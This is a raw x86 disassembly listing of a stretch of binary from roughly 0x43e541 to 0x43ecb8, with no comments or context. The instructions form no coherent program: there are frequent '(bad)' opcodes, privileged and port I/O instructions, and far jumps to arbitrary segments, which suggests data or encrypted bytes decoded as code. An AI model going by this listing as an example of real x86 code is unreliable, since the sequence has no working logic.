  43e541:	arpl   WORD PTR [ebx+0x67183ec5],bx
  43e547:	adc    DWORD PTR ds:0x164bc38,esi
  43e54d:	daa    
  43e54e:	ja     0x43e4f6
  43e550:	adc    eax,0xe9f084e5
  43e555:	outs   dx,DWORD PTR ds:[esi]
  43e556:	scas   al,BYTE PTR es:[edi]
  43e557:	jp     0x43e5d5
  43e559:	nop
  43e55a:	xchg   ebp,eax
  43e55b:	push   esi
  43e55c:	outs   dx,DWORD PTR ds:[esi]
  43e55d:	fdiv   DWORD PTR [ebp-0x43ff01bc]
  43e563:	dec    ecx
  43e564:	xchg   esi,eax
  43e565:	movups xmm3,xmm2
  43e568:	sub    ch,BYTE PTR [ebx-0x6527f771]
  43e56e:	repnz adc eax,DWORD PTR [edx+0x37]
  43e572:	or     ch,BYTE PTR [ecx+0x4]
  43e575:	iret   
  43e576:	mov    ecx,0xcc5f3c94
  43e57b:	sbb    DWORD PTR ds:0x93f1c176,edx
  43e581:	push   ss
  43e582:	or     esi,DWORD PTR [esp-0x19]
  43e586:	jle    0x43e5e5
  43e588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e589:	fs mov edx,0xa1aa9d34
  43e58f:	iret   
  43e590:	sbb    eax,0x1827911f
  43e595:	pop    ecx
  43e596:	imul   ebp,DWORD PTR ds:0xad2cd816,0xd883c91e
  43e5a0:	jecxz  0x43e545
  43e5a2:	(bad)  
  43e5a3:	mov    ax,ds:0x4496a2cb
  43e5aa:	out    dx,al
  43e5ab:	jp     0x43e5fd
  43e5ad:	nop
  43e5ae:	and    al,0x8f
  43e5b0:	pop    ds
  43e5b1:	imul   edi,DWORD PTR [ebp-0x47d1ac9e],0x6ba2799f
  43e5bb:	cmp    cl,BYTE PTR [ecx+ecx*4-0x19a6f857]
  43e5c2:	cld    
  43e5c3:	dec    ebx
  43e5c4:	popf   
  43e5c5:	mov    ?,WORD PTR [edx-0x1bd6b75c]
  43e5cb:	fwait
  43e5cc:	push   es
  43e5cd:	push   edx
  43e5ce:	enter  0x6929,0xa8
  43e5d2:	pop    es
  43e5d3:	retf   0xe2db
  43e5d6:	jge    0x43e559
  43e5d8:	mov    bl,0xe3
  43e5da:	mov    al,0x34
  43e5dc:	cmp    dl,0xc5
  43e5df:	repz jne 0x43e5ab
  43e5e2:	lods   al,BYTE PTR ds:[esi]
  43e5e3:	in     al,dx
  43e5e4:	push   ebp
  43e5e5:	mov    esi,0x920ab6f
  43e5ea:	adc    ebx,DWORD PTR [ecx-0x40f1d814]
  43e5f0:	loopne 0x43e58f
  43e5f2:	imul   esp,DWORD PTR [ebp+0x2d],0xffffffa6
  43e5f6:	mov    DWORD PTR [eax+0xe4a4a7d],edi
  43e5fc:	sahf   
  43e5fd:	jmp    0x19d1:0xd467c4ba
  43e604:	push   esi
  43e605:	mov    edx,0xa172db98
  43e60a:	popf   
  43e60b:	inc    esi
  43e60c:	icebp  
  43e60d:	rdtsc  
  43e60f:	in     eax,dx
  43e610:	and    BYTE PTR [ecx-0x785d5105],cl
  43e616:	aaa    
  43e617:	or     eax,edi
  43e619:	and    ebx,DWORD PTR [ebx+0x5d]
  43e61c:	aad    0x54
  43e61e:	push   edi
  43e61f:	jmp    0x2bc04622
  43e624:	or     al,0x6b
  43e626:	mov    ecx,0xe7a11f2d
  43e62b:	(bad)  
  43e62c:	cld    
  43e62d:	and    ebp,DWORD PTR [eax+0x5b9ae19e]
  43e633:	ror    DWORD PTR [ebp+0x58],cl
  43e636:	and    eax,0xbdc92107
  43e63b:	jp     0x43e65a
  43e63d:	push   esp
  43e63e:	push   edi
  43e63f:	inc    esp
  43e640:	enter  0x9ba3,0xa9
  43e644:	cdq    
  43e645:	lods   eax,DWORD PTR ds:[esi]
  43e646:	or     bh,dh
  43e648:	mov    DWORD PTR [edi-0x5d],ebx
  43e64b:	mov    fs,ebx
  43e64d:	and    DWORD PTR [edi-0x14f6990c],edi
  43e653:	inc    ebp
  43e654:	jne    0x43e5ea
  43e656:	dec    edi
  43e657:	in     eax,0x91
  43e659:	loopne 0x43e671
  43e65b:	pop    esp
  43e65c:	pop    ss
  43e65d:	aam    0x46
  43e65f:	stc    
  43e660:	and    BYTE PTR [edi+eax*8-0xc],bh
  43e664:	into   
  43e665:	in     eax,dx
  43e666:	pushf  
  43e667:	retf   
  43e668:	shr    BYTE PTR [ebx-0x1a0e3f45],1
  43e66e:	clc    
  43e66f:	dec    esi
  43e670:	jns    0x43e611
  43e672:	repz pop ds
  43e674:	sbb    BYTE PTR [ebp+0x16],0xab
  43e678:	push   es
  43e679:	pusha  
  43e67a:	dec    esi
  43e67b:	sahf   
  43e67c:	mul    DWORD PTR [eax-0x40006a45]
  43e682:	and    eax,0xa8d91dec
  43e687:	xchg   edx,eax
  43e688:	hlt    
  43e689:	xchg   ecx,eax
  43e68a:	adc    al,0x26
  43e68c:	mov    eax,ds:0x9e914b9f
  43e691:	gs dec ebp
  43e693:	inc    esi
  43e694:	sub    eax,0xa322670e
  43e699:	je     0x43e65a
  43e69b:	adc    al,0xbf
  43e69d:	xor    eax,0xa3c6361b
  43e6a2:	shl    BYTE PTR [edx+0x7fbb6919],0x8
  43e6a9:	push   ds
  43e6aa:	pop    edi
  43e6ab:	lahf   
  43e6ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e6ad:	repnz mov esi,0x81262024
  43e6b3:	push   cs
  43e6b4:	xchg   esi,eax
  43e6b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e6b6:	adc    bl,BYTE PTR [eax+esi*1]
  43e6b9:	mov    al,0xfd
  43e6bb:	(bad)  
  43e6bc:	push   ds
  43e6bd:	sti    
  43e6be:	mov    eax,0x3470462e
  43e6c3:	cld    
  43e6c4:	test   DWORD PTR [esi],edx
  43e6c6:	ret    
  43e6c7:	hlt    
  43e6c8:	cmovge esp,DWORD PTR [ebx-0x4458741d]
  43e6cf:	sbb    DWORD PTR [eax],0xffffff84
  43e6d2:	aam    0xa3
  43e6d4:	es pop edi
  43e6d6:	mov    ebx,0x91208772
  43e6db:	in     eax,0x5a
  43e6dd:	fisttp WORD PTR [eax+0x60]
  43e6e0:	jmp    0xf8409e98
  43e6e5:	sar    DWORD PTR [esi-0x4a],0x3d
  43e6e9:	shl    ch,cl
  43e6eb:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e6ed:	cdq    
  43e6ee:	and    DWORD PTR [edi+0x4e7ec84],ebx
  43e6f4:	popf   
  43e6f5:	popf   
  43e6f6:	mov    BYTE PTR [eax],dl
  43e6f8:	xor    bl,BYTE PTR [ebx+0xb06e41a]
  43e6fe:	pop    esp
  43e6ff:	push   ebp
  43e700:	(bad)  
  43e701:	fwait
  43e702:	jns    0x43e722
  43e704:	scas   eax,DWORD PTR es:[edi]
  43e705:	xor    ebx,DWORD PTR [ebp+0x2f]
  43e708:	repnz fdivr DWORD PTR [ebp-0x244f9f6c]
  43e70f:	jmp    0x43e6d7
  43e711:	inc    ecx
  43e712:	sub    al,0x1a
  43e714:	and    al,0xfc
  43e716:	jl     0x43e725
  43e718:	add    eax,0x1681b2ec
  43e71d:	cmp    DWORD PTR [ebx+0x6dffdf54],0x45dc95ae
  43e727:	out    dx,al
  43e728:	add    esp,esp
  43e72a:	rcr    DWORD PTR [ecx],cl
  43e72c:	sbb    DWORD PTR [ecx+0x7ce5a411],ecx
  43e732:	push   ebx
  43e733:	jnp    0x43e797
  43e735:	js     0x43e766
  43e737:	jmp    0x43e75a
  43e739:	jno    0x43e6c4
  43e73b:	lds    esi,FWORD PTR [ebx+0x17467354]
  43e741:	fnstcw WORD PTR [esi+0x22]
  43e744:	int3   
  43e745:	pop    ecx
  43e746:	ror    BYTE PTR [eax-0x41],cl
  43e749:	sub    DWORD PTR [ebx],eax
  43e74b:	into   
  43e74c:	xchg   esi,eax
  43e74d:	or     ah,dl
  43e74f:	and    edi,DWORD PTR ds:0x42c75c1f
  43e755:	jmp    0x43e780
  43e757:	lds    ebx,FWORD PTR [ebx]
  43e759:	adc    eax,0xd4af88f5
  43e75e:	sub    ebx,DWORD PTR [ebx]
  43e760:	xchg   edi,eax
  43e761:	cmp    dl,BYTE PTR [ebx]
  43e763:	mov    edi,0xc4fcf898
  43e768:	sbb    DWORD PTR [ecx-0x5c77b5e9],ebx
  43e76e:	cmp    al,0xf0
  43e770:	ins    DWORD PTR es:[edi],dx
  43e771:	push   cs
  43e772:	(bad)  
  43e773:	fs inc ebp
  43e775:	dec    eax
  43e776:	mov    cl,0x44
  43e778:	xchg   esi,eax
  43e779:	fadd   QWORD PTR [edi+ebx*1]
  43e77c:	and    eax,0xa1e85dba
  43e781:	jg     0x43e728
  43e783:	outs   dx,BYTE PTR ds:[esi]
  43e784:	mov    DWORD PTR [ebx+0x481d82ae],ecx
  43e78a:	mov    bh,0x64
  43e78c:	rep ins DWORD PTR es:[edi],dx
  43e78e:	pop    esp
  43e78f:	jne    0x43e747
  43e791:	mov    eax,0x1a3944bc
  43e796:	fistp  DWORD PTR [esi-0x17ec623b]
  43e79c:	mov    esp,0x8ab29557
  43e7a1:	imul   ebp,DWORD PTR [ecx+0x12],0x265c4eef
  43e7a8:	ret    
  43e7a9:	push   ebx
  43e7aa:	mov    edi,0x527ce591
  43e7af:	out    0x2a,eax
  43e7b1:	out    dx,al
  43e7b2:	jnp    0x43e80e
  43e7b4:	loop   0x43e7e2
  43e7b6:	dec    edx
  43e7b7:	cmp    al,0xd
  43e7b9:	stos   DWORD PTR es:[edi],eax
  43e7ba:	retf   0x25cd
  43e7bd:	dec    ecx
  43e7be:	or     edx,DWORD PTR [eax+0x1afda09f]
  43e7c4:	xchg   ebp,eax
  43e7c5:	mov    bh,0x85
  43e7c7:	call   0x9b2ccf03
  43e7cc:	push   esp
  43e7cd:	test   eax,0xe5d43bcf
  43e7d2:	sbb    esi,edx
  43e7d4:	nop
  43e7d5:	ret    0xf247
  43e7d8:	xchg   edi,eax
  43e7d9:	pop    ss
  43e7da:	lahf   
  43e7db:	lods   eax,DWORD PTR ds:[esi]
  43e7dc:	sub    DWORD PTR [edi],esp
  43e7de:	fsubr  st,st(7)
  43e7e0:	adc    al,BYTE PTR [ebp+0x3eeb84a6]
  43e7e6:	mov    esi,0x3aff5154
  43e7eb:	jns    0x43e7a2
  43e7ed:	push   eax
  43e7ee:	pop    edx
  43e7ef:	jmp    0xd608770b
  43e7f4:	push   0xa6144719
  43e7f9:	scas   eax,DWORD PTR es:[edi]
  43e7fa:	loopne 0x43e86d
  43e7fc:	dec    esi
  43e7fd:	dec    ecx
  43e7fe:	mov    esp,0xd29b0fb4
  43e803:	bound  eax,QWORD PTR [esi-0x66a48d07]
  43e809:	sahf   
  43e80a:	sti    
  43e80b:	jle    0x43e835
  43e80d:	fnsave [edi]
  43e80f:	and    ebx,DWORD PTR [ebp+0x17]
  43e812:	daa    
  43e813:	mov    ch,0x28
  43e815:	fiadd  WORD PTR [edi+edi*1]
  43e818:	sub    al,0xa7
  43e81a:	pop    ecx
  43e81b:	xor    dh,BYTE PTR [ecx]
  43e81d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e81e:	cmp    edx,DWORD PTR [esi+ecx*4+0xe9f7e96]
  43e825:	js     0x43e881
  43e827:	out    0x5b,eax
  43e829:	retf   0xc5f4
  43e82c:	mov    ch,0xa9
  43e82e:	iret   
  43e82f:	icebp  
  43e830:	retf   0x2dfe
  43e833:	das    
  43e834:	imul   ebx,DWORD PTR [edi+0x67929d50],0xd1e174bc
  43e83e:	les    eax,FWORD PTR [ebp+0x67]
  43e841:	leave  
  43e842:	mov    cl,0x74
  43e844:	adc    BYTE PTR [eax],dh
  43e846:	jecxz  0x43e807
  43e848:	gs add eax,0x7902fbc9
  43e84e:	iret   
  43e84f:	mov    ss,WORD PTR [eax+eax*4+0x1c]
  43e853:	mov    bl,0xa5
  43e855:	mov    ecx,0x2254b3
  43e85a:	mov    ah,0xd6
  43e85c:	pop    ss
  43e85d:	jg     0x43e7e5
  43e85f:	pop    edx
  43e860:	add    eax,0xa2f1dddb
  43e865:	push   edx
  43e866:	fs mov esp,0xe49ef9fb
  43e86c:	clc    
  43e86d:	jl     0x43e883
  43e86f:	(bad)  
  43e870:	push   ebp
  43e871:	push   es
  43e872:	pop    ecx
  43e873:	in     eax,dx
  43e874:	push   0xffffffa7
  43e876:	jmp    0x43e8ba
  43e878:	call   0xb943:0x365354d0
  43e87f:	jne    0x43e811
  43e881:	mov    ds:0x1c05abfa,al
  43e886:	psllw  mm3,QWORD PTR [ebp-0x6fbdba15]
  43e88d:	fstp   DWORD PTR [ebx+0x4ec2bfec]
  43e893:	test   al,0x71
  43e895:	cmp    eax,eax
  43e897:	inc    esp
  43e898:	gs popf 
  43e89a:	mov    ebx,0x7083a37b
  43e89f:	cmc    
  43e8a0:	es (bad) 
  43e8a3:	adc    ecx,ecx
  43e8a5:	int    0xb2
  43e8a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e8a8:	sahf   
  43e8a9:	add    BYTE PTR [edx-0x11],cl
  43e8ac:	out    0xf0,al
  43e8ae:	dec    esi
  43e8af:	add    ch,dl
  43e8b1:	mov    eax,0xb1258b02
  43e8b6:	sbb    BYTE PTR [edi-0x1453b6e8],dl
  43e8bc:	pop    esi
  43e8bd:	ret    0x882f
  43e8c0:	lods   eax,DWORD PTR ds:[esi]
  43e8c1:	mov    eax,ds:0xaf10ffdb
  43e8c6:	jo     0x43e889
  43e8c8:	sbb    edx,ebx
  43e8ca:	xor    BYTE PTR [eax-0x2b35e3ee],ah
  43e8d0:	mov    edx,0x3c5726e9
  43e8d5:	fwait
  43e8d6:	cmp    esi,ecx
  43e8d8:	jae    0x43e922
  43e8da:	sub    edi,ebx
  43e8dc:	in     al,0xf9
  43e8de:	sbb    al,0x85
  43e8e0:	push   cs
  43e8e1:	or     bl,BYTE PTR [ecx]
  43e8e3:	xchg   ebx,eax
  43e8e4:	ins    DWORD PTR es:[edi],dx
  43e8e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e8e6:	cdq    
  43e8e7:	mov    ebp,0x3810f73
  43e8ec:	and    eax,0x7de8f79d
  43e8f1:	xor    cl,bh
  43e8f3:	jecxz  0x43e947
  43e8f5:	mov    ecx,0x5c028235
  43e8fa:	stos   DWORD PTR es:[edi],eax
  43e8fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e8fc:	push   ecx
  43e8fd:	adc    eax,0x3fe56bdc
  43e902:	fdivr  st,st(1)
  43e904:	jle    0x43e939
  43e906:	loopne 0x43e8fa
  43e908:	and    eax,0xee6ff695
  43e90d:	test   eax,0xc338b83b
  43e912:	inc    ebx
  43e913:	cmp    ebx,DWORD PTR [edi-0x29122408]
  43e919:	xchg   edx,eax
  43e91a:	jne    0x43e932
  43e91c:	mov    cl,0x38
  43e91e:	or     al,0xb9
  43e920:	and    DWORD PTR [edi+0x98820da],ecx
  43e926:	cdq    
  43e927:	icebp  
  43e928:	ret    
  43e929:	leave  
  43e92a:	sbb    dh,bl
  43e92c:	pop    ss
  43e92d:	push   esi
  43e92e:	das    
  43e92f:	xchg   ebx,eax
  43e930:	adc    esi,DWORD PTR [esi-0x585658d5]
  43e936:	push   ds
  43e937:	clc    
  43e938:	jns    0x43e960
  43e93a:	jp     0x43e97d
  43e93c:	stos   BYTE PTR es:[edi],al
  43e93d:	inc    eax
  43e93e:	add    eax,DWORD PTR [esi]
  43e940:	outs   dx,BYTE PTR ds:[esi]
  43e941:	xor    DWORD PTR [eax+0x383e5c64],esi
  43e947:	ss in  eax,0xd6
  43e94a:	mov    cl,0xb8
  43e94c:	lds    ebx,FWORD PTR [esi+0x906eb53]
  43e952:	retf   
  43e953:	mov    ebp,0xc87ab988
  43e958:	shl    DWORD PTR [edi+0x24587d20],1
  43e95e:	mov    cl,0x9a
  43e960:	aad    0xb5
  43e962:	aaa    
  43e963:	hlt    
  43e964:	xchg   ebx,eax
  43e965:	add    edx,DWORD PTR [ebx]
  43e967:	dec    edi
  43e968:	sbb    edi,DWORD PTR [ecx]
  43e96a:	jl     0x43e9e5
  43e96c:	inc    ecx
  43e96d:	mov    dh,0x1a
  43e96f:	les    ebx,FWORD PTR [ecx+0x216edf3e]
  43e975:	xor    ecx,edi
  43e977:	out    dx,eax
  43e978:	pop    edx
  43e979:	or     al,0x11
  43e97b:	pusha  
  43e97c:	(bad)  
  43e97d:	jmp    0x4d4c:0xc91a9958
  43e984:	(bad)  
  43e985:	mov    esp,0xbb1546ea
  43e98a:	xchg   ecx,eax
  43e98b:	out    dx,al
  43e98c:	pop    ecx
  43e98d:	dec    ebp
  43e98e:	aam    0xdd
  43e990:	sbb    ecx,DWORD PTR [ecx]
  43e992:	mov    dh,0x8a
  43e994:	loop   0x43e983
  43e996:	mov    edx,cs
  43e998:	std    
  43e999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e99a:	cmp    eax,ecx
  43e99c:	mov    cl,0x9b
  43e99e:	sbb    esp,edi
  43e9a0:	retf   0x19d8
  43e9a3:	jnp    0x43e929
  43e9a5:	push   ds
  43e9a6:	sahf   
  43e9a7:	es ss pushf 
  43e9aa:	scas   eax,DWORD PTR es:[edi]
  43e9ab:	dec    ebp
  43e9ac:	test   BYTE PTR [ebx-0x10d8fc90],0xff
  43e9b3:	scas   eax,DWORD PTR es:[edi]
  43e9b4:	jge    0x43e940
  43e9b6:	scas   al,BYTE PTR es:[edi]
  43e9b7:	repnz xchg ebx,eax
  43e9b9:	outs   dx,BYTE PTR ds:[esi]
  43e9ba:	xlat   BYTE PTR ds:[ebx]
  43e9bb:	pop    ecx
  43e9bc:	fcmovnb st,st(5)
  43e9be:	mov    ah,0x84
  43e9c0:	es jno 0x43ea41
  43e9c3:	pop    esp
  43e9c4:	in     eax,0x45
  43e9c6:	and    al,ch
  43e9c8:	pop    ds
  43e9c9:	out    dx,eax
  43e9ca:	push   edi
  43e9cb:	push   edx
  43e9cc:	and    bh,BYTE PTR [ecx-0x6b06acf5]
  43e9d2:	(bad)  
  43e9d3:	lock jmp 0x2050cb3a
  43e9d9:	(bad)  
  43e9db:	push   eax
  43e9dc:	popa   
  43e9dd:	and    al,0x7c
  43e9df:	aas    
  43e9e0:	and    eax,0x564b3d39
  43e9e5:	out    0x8b,al
  43e9e7:	jbe    0x43e98d
  43e9e9:	jle    0x43ea67
  43e9eb:	sbb    al,0x17
  43e9ed:	mov    edx,0x3152795a
  43e9f2:	mov    ebx,DWORD PTR [eax]
  43e9f4:	pushf  
  43e9f5:	jb     0x43ea58
  43e9f7:	add    DWORD PTR [edi],ebx
  43e9f9:	leave  
  43e9fa:	add    al,0x96
  43e9fc:	mov    esi,0x97c9745b
  43ea01:	popf   
  43ea02:	mov    edx,DWORD PTR [ebp-0x79b17fc7]
  43ea08:	sbb    ebp,DWORD PTR [eax+edx*4-0x27]
  43ea0c:	fwait
  43ea0d:	and    DWORD PTR [esi-0x266b895c],esi
  43ea13:	test   al,0xd5
  43ea15:	push   0x76bbf43f
  43ea1a:	popa   
  43ea1b:	(bad)  
  43ea1d:	stc    
  43ea1e:	adc    DWORD PTR [esi],0xb2b8718f
  43ea24:	adc    edx,DWORD PTR [esi-0x693086f4]
  43ea2a:	cmp    al,0x8f
  43ea2c:	repz lds ebx,FWORD PTR es:[edx]
  43ea30:	add    dl,BYTE PTR [ebx]
  43ea32:	xchg   edi,eax
  43ea33:	test   eax,0x14b9912c
  43ea38:	scas   eax,DWORD PTR es:[edi]
  43ea39:	sbb    DWORD PTR [esi],edx
  43ea3b:	and    al,0x5a
  43ea3d:	sqrtps xmm5,XMMWORD PTR [ecx+0x26]
  43ea41:	fisttp WORD PTR ds:0xdb6775d5
  43ea47:	jmp    0x6664b4c0
  43ea4c:	mov    ch,0x11
  43ea4e:	mov    eax,0x5e1c7004
  43ea53:	shl    BYTE PTR ds:0x3cabdba4,cl
  43ea59:	ret    
  43ea5a:	dec    esp
  43ea5b:	pop    ss
  43ea5c:	mov    ch,0xa9
  43ea5e:	lods   al,BYTE PTR ds:[esi]
  43ea5f:	retf   0x4c8c
  43ea62:	mov    esi,0x8a514e24
  43ea67:	push   ecx
  43ea68:	xchg   ebp,eax
  43ea69:	aad    0x51
  43ea6b:	out    0xd0,eax
  43ea6d:	jne    0x43ea26
  43ea6f:	mov    edi,0xecc06498
  43ea74:	lds    eax,FWORD PTR [ebp+0x420204b8]
  43ea7a:	sub    esi,edx
  43ea7c:	jmp    0xc3d77ce7
  43ea81:	popf   
  43ea82:	fwait
  43ea83:	(bad)  
  43ea84:	xlat   BYTE PTR ds:[ebx]
  43ea85:	sbb    eax,0x8bb7ac9
  43ea8a:	fnsave [ebp*2+0x2e95285f]
  43ea91:	jmp    FWORD PTR [eax+0x59a1023e]
  43ea97:	dec    esi
  43ea98:	sub    DWORD PTR [ecx],ebp
  43ea9a:	mov    WORD PTR [edx+eiz*1+0x101ee22],fs
  43eaa1:	(bad)  
  43eaa2:	mov    eax,ds:0xe782b138
  43eaa7:	jb     0x43eade
  43eaa9:	addr16 adc al,dh
  43eaac:	(bad)  
  43eaad:	pop    edx
  43eaae:	ror    BYTE PTR [esi-0x29],cl
  43eab1:	pop    esp
  43eab2:	rcr    DWORD PTR [edi],0x37
  43eab5:	push   edx
  43eab6:	and    eax,0x6b99e9df
  43eabb:	shl    ebp,1
  43eabd:	or     ebp,DWORD PTR [edx-0x3fd4daaf]
  43eac3:	in     eax,dx
  43eac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43eac5:	or     BYTE PTR [ecx],dl
  43eac7:	(bad)  
  43eac8:	push   ecx
  43eac9:	xor    bh,bh
  43eacb:	inc    ebx
  43eacc:	add    eax,0xea84c04a
  43ead1:	aad    0x41
  43ead3:	scas   eax,DWORD PTR es:[edi]
  43ead4:	jmp    0xbbbe:0x9fe2fe80
  43eadb:	pop    ax
  43eadd:	mov    bh,0x62
  43eadf:	cli    
  43eae0:	push   edi
  43eae1:	sar    BYTE PTR [edi+0x731fcdfa],cl
  43eae7:	(bad)  
  43eae8:	aad    0x58
  43eaea:	fwait
  43eaeb:	lock mov dh,0x20
  43eaee:	fiadd  DWORD PTR es:[esi+ebx*4-0x65]
  43eaf3:	inc    ebp
  43eaf4:	cmp    dl,BYTE PTR [edi+0x43]
  43eaf7:	or     al,0x6e
  43eaf9:	xchg   ebp,eax
  43eafa:	sbb    DWORD PTR [ebx],edi
  43eafc:	sbb    al,0xf9
  43eafe:	xlat   BYTE PTR ds:[ebx]
  43eaff:	sar    DWORD PTR [ebx],cl
  43eb01:	inc    esi
  43eb02:	and    ecx,DWORD PTR [esi-0x7c6ca2b0]
  43eb08:	mov    ah,0xa4
  43eb0a:	imul   edx,eax,0x72
  43eb0d:	jmp    0xcef01642
  43eb12:	dec    ebx
  43eb13:	or     BYTE PTR [eax+0x1ee4badc],dl
  43eb19:	loopne 0x43eb36
  43eb1b:	pop    edx
  43eb1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43eb1d:	jge    0x43eb8e
  43eb1f:	retf   
  43eb20:	add    ch,BYTE PTR [edx-0x75]
  43eb23:	mov    ecx,0xfcb338b5
  43eb28:	dec    ebp
  43eb29:	sbb    DWORD PTR [ecx],ecx
  43eb2b:	daa    
  43eb2c:	mov    dh,0x67
  43eb2e:	push   ecx
  43eb2f:	(bad)  
  43eb30:	xchg   esp,eax
  43eb31:	je     0x43eb06
  43eb33:	pushw  es
  43eb35:	popf   
  43eb36:	lahf   
  43eb37:	and    al,bl
  43eb39:	(bad)  
  43eb3a:	xchg   esi,eax
  43eb3b:	mov    esp,0xd3b26603
  43eb40:	push   ebp
  43eb41:	sub    BYTE PTR [eax+0x435ef6c4],dh
  43eb47:	jge    0x43eb9e
  43eb49:	adc    esi,0xaa640ef0
  43eb4f:	xchg   esi,eax
  43eb50:	sbb    DWORD PTR [ecx+0x157ac9df],ebp
  43eb56:	ins    DWORD PTR es:[edi],dx
  43eb57:	xchg   BYTE PTR [eax-0x28bd53f7],bl
  43eb5d:	xchg   esp,eax
  43eb5e:	or     ecx,DWORD PTR [edx-0x52]
  43eb61:	jae    0x43eaea
  43eb63:	in     eax,dx
  43eb64:	and    esp,DWORD PTR [edx+0x71556fcc]
  43eb6a:	xor    DWORD PTR [esi],0x69da6a81
  43eb70:	push   ss
  43eb71:	aaa    
  43eb72:	gs in  al,0x20
  43eb75:	ret    0xdab6
  43eb78:	and    BYTE PTR [ecx],bl
  43eb7a:	push   ss
  43eb7b:	mov    dh,0x74
  43eb7d:	(bad)  
  43eb7e:	push   edx
  43eb7f:	dec    edx
  43eb80:	and    bh,BYTE PTR [edi+0x1c]
  43eb83:	(bad)  
  43eb84:	daa    
  43eb85:	push   ecx
  43eb86:	dec    edx
  43eb87:	and    al,0x2f
  43eb89:	cmp    dh,ch
  43eb8b:	cli    
  43eb8c:	sub    BYTE PTR [ebp+0x78e97230],cl
  43eb92:	mov    eax,0x47ecbd4
  43eb97:	clc    
  43eb98:	out    0x3a,eax
  43eb9a:	mov    ch,0xbc
  43eb9c:	sar    DWORD PTR [esi-0x7a],0xec
  43eba0:	push   ecx
  43eba1:	addr16 sbb al,0x3c
  43eba4:	jae    0x43eba1
  43eba6:	es int3 
  43eba8:	jmp    0x43eb48
  43ebaa:	imul   esi,DWORD PTR [ecx-0x25],0xffffff98
  43ebae:	out    dx,eax
  43ebaf:	aaa    
  43ebb0:	mov    bh,BYTE PTR [ebp-0x3e]
  43ebb3:	ins    BYTE PTR es:[edi],dx
  43ebb4:	sbb    al,0x19
  43ebb6:	sbb    ebp,DWORD PTR [ebp+eax*2+0x77b73ec4]
  43ebbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ebbe:	sbb    esi,esp
  43ebc0:	pushf  
  43ebc1:	repnz pop edx
  43ebc3:	lock push ecx
  43ebc5:	and    al,cl
  43ebc7:	out    0xff,al
  43ebc9:	fnstcw WORD PTR [edx+0x20bc6554]
  43ebcf:	lds    esi,FWORD PTR [ebp-0x68b2f464]
  43ebd5:	xor    esi,DWORD PTR [eax+0x7acead2a]
  43ebdb:	nop
  43ebdc:	mov    bh,0x9c
  43ebde:	mov    esp,0xb7514f4
  43ebe3:	cs aad 0x62
  43ebe6:	jae    0x43ebd9
  43ebe8:	outs   dx,DWORD PTR ds:[esi]
  43ebe9:	cmp    eax,0x991cc13d
  43ebee:	outs   dx,BYTE PTR ds:[esi]
  43ebef:	push   ebp
  43ebf0:	lods   eax,DWORD PTR ds:[esi]
  43ebf1:	test   DWORD PTR [ebx-0x4575d9d],esp
  43ebf7:	pop    ds
  43ebf8:	sbb    BYTE PTR [ecx],al
  43ebfa:	fcomp  DWORD PTR [ebx-0x7a2c44da]
  43ec00:	js     0x43ec68
  43ec02:	(bad)
  43ec05:	ins    DWORD PTR es:[edi],dx
  43ec06:	mul    DWORD PTR [esi]
  43ec08:	mul    BYTE PTR [edi-0x71e4ee85]
  43ec0e:	sar    BYTE PTR [ebx-0x48],cl
  43ec11:	xchg   esp,eax
  43ec12:	push   esi
  43ec13:	mov    esi,0x54bb12e8
  43ec18:	ror    DWORD PTR [edx+eax*4-0x46],0x76
  43ec1d:	dec    ecx
  43ec1e:	sub    BYTE PTR [eax+0x22],bh
  43ec21:	test   eax,0x311afd21
  43ec26:	test   cl,bh
  43ec28:	(bad)  
  43ec29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ec2a:	mov    eax,0x816418e4
  43ec2f:	push   edi
  43ec30:	mov    ebx,0x6bef1524
  43ec35:	jge    0x43ec7a
  43ec37:	aam    0x9c
  43ec39:	loop   0x43ebf6
  43ec3b:	adc    al,0x1a
  43ec3d:	fdivrp st(6),st
  43ec3f:	xchg   ecx,eax
  43ec40:	pop    ebx
  43ec41:	mov    dh,bh
  43ec43:	stos   BYTE PTR es:[edi],al
  43ec44:	dec    eax
  43ec45:	adc    eax,0xfbd614b3
  43ec4a:	sub    DWORD PTR [edx-0x77645aa4],ebp
  43ec50:	mov    ds:0x69d7d29c,al
  43ec55:	pushf  
  43ec56:	dec    ebx
  43ec57:	sbb    BYTE PTR [edx-0x3b],dl
  43ec5a:	mov    bl,BYTE PTR [esp+ebx*2+0x59]
  43ec5e:	lock mov esi,0xbc2aa990
  43ec64:	and    al,BYTE PTR [ecx+0x34]
  43ec67:	inc    ebp
  43ec68:	xlat   BYTE PTR ds:[ebx]
  43ec69:	sti    
  43ec6a:	mov    dh,0xa3
  43ec6c:	gs out dx,al
  43ec6e:	sub    esi,esp
  43ec70:	xchg   ebx,eax
  43ec71:	(bad)  
  43ec72:	rcr    BYTE PTR [edx],0x46
  43ec75:	or     DWORD PTR [edx-0x35],ebx
  43ec78:	lahf   
  43ec79:	mov    ch,0xb5
  43ec7b:	ins    DWORD PTR es:[edi],dx
  43ec7c:	pop    esi
  43ec7d:	cmp    ecx,DWORD PTR [eax+0x7bb4d56e]
  43ec83:	xor    ch,bl
  43ec85:	ins    BYTE PTR es:[edi],dx
  43ec86:	mov    ds:0x499f8227,eax
  43ec8b:	call   0xe596:0xd381891d
  43ec92:	push   0x935f65d9
  43ec97:	mov    dh,0xa5
  43ec99:	test   al,0x66
  43ec9b:	in     eax,dx
  43ec9c:	neg    esi
  43ec9e:	in     eax,0x66
  43eca0:	pushf  
  43eca1:	sbb    al,0x11
  43eca3:	push   esi
  43eca4:	or     eax,0x194de73b
  43eca9:	inc    ebp
  43ecaa:	shl    DWORD PTR [ebx+0x539b0c4c],0x15
  43ecb1:	or     eax,0x6208f3d8
  43ecb6:	rcl    eax,1
  43ecb8:	push   ss
